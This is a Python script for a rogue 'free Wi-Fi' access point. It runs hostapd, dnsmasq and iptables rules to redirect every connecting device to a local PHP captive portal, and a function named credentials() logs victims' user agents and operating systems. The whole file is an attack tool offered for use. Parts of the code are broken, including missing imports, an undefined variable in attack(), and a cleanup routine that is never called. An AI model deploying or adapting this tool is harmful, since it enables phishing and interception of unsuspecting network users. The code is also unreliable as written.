import os
import subprocess
import sys

def check_root():
    if os.geteuid() != 0:
        clear_screen()
        header()
        print("The program cannot run.\nFor run program in GNU/Linux Operating System,\nGive root privileges and try again.")
        sys.exit(1)

def clear_screen():
    os.system("clear")

def header():
    print(''' 
/$$$$$$$  /$$$$$$$$ /$$$$$$$   /$$$$$$  /$$$$$$$$  /$$$$$$ 
| $$__  $$| $$_____/| $$__  $$ /$$__  $$| $$_____/ /$$__  $$
| $$  \ $$| $$      | $$  \ $$| $$  \__/| $$      | $$  \__/
| $$  | $$| $$$$$   | $$  | $$|  $$$$$$ | $$$$$   | $$      
| $$  | $$| $$__/   | $$  | $$ \____  $$| $$__/   | $$      
| $$  | $$| $$      | $$  | $$ /$$  \ $$| $$      | $$    $$
| $$$$$$$/| $$$$$$$$| $$$$$$$/|  $$$$$$/| $$$$$$$$|  $$$$$$/
|_______/ |________/|_______/  \______/ |________/ \______/''')

def install_packages():
    print("\nInstalling required packages...")
    
    if os.path.exists("/usr/sbin/hostapd") and os.path.exists("/usr/sbin/dnsmasq"):
        print("\nPackages already installed.")
        return
    
    else:
        print("\nInstalling packages: hostapd dnsmasq")
        
        package_managers = [
            ("apt", "apt install hostapd dnsmasq -y"),
            ("apt-get", "apt-get install hostapd dnsmasq -y"),
            ("pacman", "sudo pacman -S hostapd dnsmasq --noconfirm"),
            ("dnf", "sudo dnf -y install hostapd dnsmasq")
        ]
        
        for manager, command in package_managers:
            if shutil.which(manager):
                subprocess.run(command, shell=True, executable="/bin/bash")
                return
        
        print("\nUnsupported package manager, Install packages manually.")

def pid_kill():
    for process in ["hostapd", "dnsmasq", "php"]:
        subprocess.run(f"killall {process} > /dev/null 2>&1", shell=True, executable="/bin/bash")

def start_1():
    subprocess.run("systemctl stop NetworkManager.service", shell=True, executable="/bin/bash")
    clear_screen()
    header()
    ethernet = "lo"
    print("\nSelect wifi-adapter (with support AP mode):")
    iw_output = subprocess.check_output("iw dev | grep -e Interface", shell=True, executable="/bin/bash").decode("utf-8")
    print(iw_output)
    wifi = input("wifi adapter: ")
    
    if os.path.exists("/etc/spoof.hosts"):
        os.rename("/etc/spoof.hosts", "/etc/spoof.BAK")
        
    print("\nWifi name example: Free-wifi or 10.0.0.1 (to access the portal)")
    wifi_name = input("wifi-name: ")
    ap_name = wifi_name
    with open("/etc/spoof.hosts", "a") as spoof_file:
        spoof_file.write(f"10.0.0.1 {wifi_name}\n")
    print(f"Wifi {wifi_name} wait for enable...")
    time.sleep(3)

def get_fingers():
    with open(".www/info.txt", "r") as info_file:
        for line in info_file:
            if "User-Agent:" in line:
                user_agent = line.strip().split(" ")[1]
                print(f"\nUser Agent: {user_agent}")
            elif "OS-System:" in line:
                os_system = line.strip().split(" ")[1]
                print(f"\nOS System: {os_system}")
    
    with open(".www/info.txt", "r") as info_file:
        with open("info.txt", "a") as output_file:
            output_file.write(info_file.read())
            
    print("\nWaiting for next device (Ctrl + C to exit).")

def credentials():
    while True:
        if os.path.exists(".www/info.txt"):
            get_fingers()
            os.remove(".www/info.txt")
        time.sleep(0.75)

def attack():
    clear_screen()
    header()
    print("\nStarting...")
    
    if os.path.exists("/etc/hostapd/hostapd.conf"):
        os.rename("/etc/hostapd/hostapd.conf", "/etc/hostapd/hostapd.bak")
    
    wifi = input("select wifi-adapter (with support AP mode): ")
    ap_name = input("wifi name example (e.g., Free-wifi or 10.0.0.1): ")
    
    with open("/etc/hostapd/hostapd.conf", "a") as hostapd_conf:
        hostapd_conf.write(f"interface={wifi}\n")
        hostapd_conf.write("driver=nl80211\n")
        hostapd_conf.write(f"ssid={ap_name}\n")
        hostapd_conf.write("hw_mode=g\n")
        hostapd_conf.write("channel=11\n")
    
    if os.path.exists("/etc/dnsmasq.conf"):
        os.rename("/etc/dnsmasq.conf", "/etc/dnsmasq.bak")
    
    with open("/etc/dnsmasq.conf", "a") as dnsmasq_conf:
        dnsmasq_conf.write("no-resolv\n")
        dnsmasq_conf.write(f"interface={wifi}\n")
        dnsmasq_conf.write("dhcp-range=10.0.0.2,10.0.0.101,12h\n")
        dnsmasq_conf.write("server=8.8.8.8\n")
        dnsmasq_conf.write("server=8.8.4.4\n")
        dnsmasq_conf.write("domain=free.wifi\n")
        dnsmasq_conf.write("address=/fake.local/10.0.0.1\n")
        dnsmasq_conf.write("addn-hosts=/etc/spoof.hosts\n")
        dnsmasq_conf.write("address=/#/10.0.0.1\n")
    
    subprocess.run(f"iptables -t mangle -N captiveportal", shell=True, executable="/bin/bash")
    subprocess.run(f"iptables -t mangle -A PREROUTING -i {wifi} -p udp --dport 53 -j RETURN", shell=True, executable="/bin/bash")
    subprocess.run(f"iptables -t mangle -A PREROUTING -i {wifi} -j captiveportal", shell=True, executable="/bin/bash")
    subprocess.run(f"iptables -t mangle -A captiveportal -j MARK --set-mark 1", shell=True, executable="/bin/bash")
    subprocess.run(f"iptables -t nat -A PREROUTING -i {wifi} -p tcp -m mark --mark 1 -j DNAT --to-destination 10.0.0.1", shell=True, executable="/bin/bash")
    subprocess.run("xterm -e nohup sysctl -w net.ipv4.ip_forward=1", shell=True, executable="/bin/bash")
    subprocess.run(f"iptables -A FORWARD -i {wifi} -j ACCEPT", shell=True, executable="/bin/bash")
    subprocess.run(f"iptables -t nat -A POSTROUTING -o {ethernet} -j MASQUERADE", shell=True, executable="/bin/bash")
    subprocess.run(f"ifconfig {wifi} up 10.0.0.1 netmask 255.255.255.0", shell=True, executable="/bin/bash")
    time.sleep(3)
    subprocess.run("killall dnsmasq > /dev/null 2>&1", shell=True, executable="/bin/bash")
    subprocess.run("dnsmasq &", shell=True, executable="/bin/bash")
    time.sleep(1)
    subprocess.run(f"hostapd -B /etc/hostapd/hostapd.conf 1> /dev/null", shell=True, executable="/bin/bash")
    host = '10.0.0.1'
    port = '80'
    os.chdir(".www")
    subprocess.run(f"php -S {host}:{port} > /dev/null 2>&1 &", shell=True, executable="/bin/bash")
    print("[ctrl + c to exit]")
    credentials()
    while True:
        input(f"{wifi} (press enter to exit): ")

def reset(wifi, ethernet):
    print("\nReset fake Wifi and exit\n")
    
    if os.path.exists("/etc/hostapd/hostapd.bak"):
        os.rename("/etc/hostapd/hostapd.bak", "/etc/hostapd/hostapd.conf")
    
    if os.path.exists("/etc/dnsmasq.bak"):
        os.rename("/etc/dnsmasq.bak", "/etc/dnsmasq.conf")
    
    if os.path.exists("/etc/spoof.bak"):
        os.rename("/etc/spoof.bak", "/etc/spoof.hosts")
    
    subprocess.run(f"iptables -t mangle -D PREROUTING -i {wifi} -p udp --dport 53 -j RETURN", shell=True, executable="/bin/bash")
    subprocess.run(f"iptables -t mangle -D PREROUTING -i {wifi} -j captiveportal", shell=True, executable="/bin/bash")
    subprocess.run(f"iptables -t mangle -D captiveportal -j MARK --set-mark 1", shell=True, executable="/bin/bash")
    subprocess.run(f"iptables -t nat -D PREROUTING -i {wifi} -p tcp -m mark --mark 1 -j DNAT --to-destination 10.0.0.1", shell=True, executable="/bin/bash")
    subprocess.run(f"iptables -D FORWARD -i {wifi} -j ACCEPT", shell=True, executable="/bin/bash")
    subprocess.run(f"iptables -t nat -D POSTROUTING -o {ethernet} -j MASQUERADE", shell=True, executable="/bin/bash")
    subprocess.run("iptables -t nat -F", shell=True, executable="/bin/bash")
    subprocess.run("iptables -t nat -X", shell=True, executable="/bin/bash")
    subprocess.run("iptables -t mangle -F", shell=True, executable="/bin/bash")
    subprocess.run("iptables -t mangle -X", shell=True, executable="/bin/bash")
    time.sleep(1)
    subprocess.run("systemctl start NetworkManager.service", shell=True, executable="/bin/bash")
    subprocess.run("service networking restart", shell=True, executable="/bin/bash")
    time.sleep(1)
    clear_screen()
    sys.exit(1)

if __name__ == "__main__":
    check_root()
    install_packages()
    pid_kill()
    start_1()
    attack()
